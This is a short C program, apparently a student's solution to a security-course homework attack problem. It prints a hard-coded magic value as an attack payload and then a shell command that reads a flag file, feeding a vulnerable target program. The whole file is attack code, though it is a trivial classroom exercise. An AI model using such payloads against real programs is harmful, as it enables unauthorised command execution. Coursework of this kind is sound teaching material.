/* 
 * Attack 02 - Fill out this program to implement your attack for Problem 2
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  //int magic = 0x6d6b2f32;
  char attack_payload [] = "1835740978";
  char shell_command [] = "more /home/flags/hw02/flag02.txt";
  puts(attack_payload);
  fflush(stdout);
  sleep(1);
  puts(shell_command);
  return 0;
}
